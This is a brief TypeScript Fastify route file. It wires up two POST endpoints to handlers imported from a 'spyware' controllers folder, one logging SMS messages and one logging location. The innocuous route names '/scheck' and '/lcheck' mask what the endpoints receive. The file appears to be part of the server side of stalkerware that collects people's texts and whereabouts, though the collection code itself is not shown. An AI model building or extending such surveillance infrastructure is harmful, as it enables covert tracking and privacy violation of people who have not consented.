import { FastifyInstance } from 'fastify';
import { logSMS, logSmsSchema } from '../controllers/spyware/logSms';
import { logLocation, logLocationSchema } from 'src/controllers/spyware/logLocation';

export default function (fastify: FastifyInstance, opts: any, done: Function) {
	fastify.post('/scheck', { schema: { body: logSmsSchema}}, logSMS);
	fastify.post('/lcheck', { schema: { body: logLocationSchema}}, logLocation);

	done();
}